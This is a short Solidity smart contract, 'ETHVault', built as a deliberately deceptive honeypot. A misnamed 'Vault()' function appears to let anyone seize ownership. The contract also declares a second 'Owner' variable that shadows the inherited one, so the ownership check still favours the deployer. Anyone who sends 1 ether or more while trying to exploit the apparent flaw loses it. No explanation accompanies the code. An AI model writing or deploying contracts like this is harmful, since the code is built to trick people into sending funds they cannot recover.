pragma solidity ^0.4.13;

contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}

contract ETHVault is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        revert();
    }

    function deposit() payable {
        if (msg.value >= 1 ether)
            if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender]) {
                Deposits[msg.sender] += msg.value;
                Deposit(msg.value);
            }
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    
    function kill() payable onlyOwner {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
}